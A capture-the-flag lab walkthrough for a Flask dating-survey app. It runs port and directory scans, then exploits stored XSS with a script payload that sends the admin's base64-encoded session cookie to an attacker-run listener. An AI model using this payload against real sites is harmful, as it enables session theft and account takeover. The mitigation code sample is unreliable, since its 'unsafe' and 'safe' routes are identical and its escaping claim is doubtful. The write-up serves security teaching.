# Cupid's Matchmaker - CTF Walkthrough

**Target:** 10.49.136.68  
**Difficulty:** Easy  
**Category:** Web Security, Stored XSS  
**Time to Compromise:** ~30 minutes

---

## Step 1: Reconnaissance

Identify open ports and services:

```bash
sudo nmap -sC -sV 10.49.136.68
```

**Results:**
- 22/tcp open ssh OpenSSH 9.6p1
- 631/tcp open ipp CUPS 2.4
- 5000/tcp open http Werkzeug httpd 3.0.1 (Python 3.12.3)


**Finding:** Flask web application running on port 5000 (primary target)

---

## Step 2: Web Application Enumeration

Discover available endpoints:

```bash
ffuf -u http://10.49.136.68:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Endpoints Found:**
- admin [Status: 302]
- login [Status: 200]
- logout [Status: 302]
- survey [Status: 200]


**Observation:** Survey endpoint accepts user input. Admin endpoint exists but redirects (requires authentication).

---

## Step 3: Vulnerability Analysis

**Key Clue from Homepage:**
> "Real humans read your personality survey"

This statement reveals the attack surface:
- User input is stored (survey submissions saved)
- Trusted users (admins) will view this data
- If input isn't sanitized → **Stored XSS vulnerability**

**Attack Flow:**
User submits malicious JavaScript
→ Stored in database
→ Admin views submission
→ JavaScript executes in admin's browser
→ Admin's sensitive data (cookies, session) exposed


---

## Step 4: Exploitation

### Step 4.1: Set up Attacker Listener

Start a Python HTTP server to receive exfiltrated data:

```bash
python3 -m http.server 8000
```

This listener will capture any fetch requests containing cookie data.

### Step 4.2: Craft XSS Payload

Create a payload that exfiltrates the admin's session cookie:

```javascript
<script>fetch('http://YOUR_IP:8000/?cookie=' + btoa(document.cookie));</script>
```

**What this does:**
- `fetch()` makes an HTTP request to your listener
- `btoa(document.cookie)` base64-encodes the cookie (ensures safe transmission)
- The encoded cookie is sent as a URL parameter

### Step 4.3: Submit the Payload

1. Navigate to `http://10.49.136.68:5000/survey`
2. Fill out the survey form
3. Paste the payload into all of the text fields
4. Submit the form

**Expected Result:** Success message appears

### Step 4.4: Wait for Admin Trigger

The admin (or automated system) will review your submission. When they view it:
- The `<script>` tag executes in their browser
- `fetch()` sends their cookie to your listener
- Check your Python server for incoming requests

---

## Step 5: Retrieve the Flag

Check your listener for the callback request: `10.49.136.68 - - [date] "GET /?cookie=[REDACTED] HTTP/1.1" 200 -`


The `cookie` parameter contains base64-encoded data. Decode it:

```bash
echo "[REDACTED]" | base64 -d
```

**Output:** `REDACTED`


---

## Key Concepts

### Stored XSS vs Reflected XSS

**Stored XSS (This Challenge):**
- Malicious code stored in database
- Triggered when ANY user views it
- Affects multiple users
- Harder to detect (no immediate feedback)
- More dangerous (persistent)

**Reflected XSS:**
- Code included in URL/request
- Only affects the person who clicks the link
- Immediate feedback to attacker
- Temporary (not stored)

### Why This Works

1. **No Input Sanitization** — Application accepts HTML/JavaScript without filtering
2. **No Output Encoding** — Admin panel displays user input as raw HTML
3. **Trusted User Trigger** — Admin's browser has access to valuable cookies/sessions
4. **Cookie Access** — JavaScript can read and exfiltrate session cookies

---

## Mitigation Strategies

### For Developers

1. **Input Validation** — Reject or filter HTML tags and JavaScript
2. **Output Encoding** — Escape HTML entities when displaying user content
3. **Content Security Policy (CSP)** — Restrict script execution
4. **HTTP-Only Cookies** — Prevent JavaScript from accessing sensitive cookies

### Example Safe Code

```python
# UNSAFE (current implementation)
@app.route('/admin/submissions')
def view_submissions():
    submissions = db.get_submissions()
    return render_template('submissions.html', submissions=submissions)
    # Template renders: {{ submission.text }} — Raw HTML!

# SAFE (with escaping)
@app.route('/admin/submissions')
def view_submissions():
    submissions = db.get_submissions()
    return render_template('submissions.html', submissions=submissions)
    # Template renders: {{ submission.text | escape }} — HTML entities
```

---

## Summary

| Phase | Action | Result |
|-------|--------|--------|
| Reconnaissance | nmap + ffuf | Found survey endpoint |
| Analysis | Read application context | Identified stored XSS vector |
| Exploitation | Crafted fetch() payload | Exfiltrated admin cookie |
| Extraction | Base64 decode | Retrieved flag |

---

**Total Time:** ~30 minutes  
**Difficulty:** Easy  
**Learning Value:** High (Stored XSS fundamentals)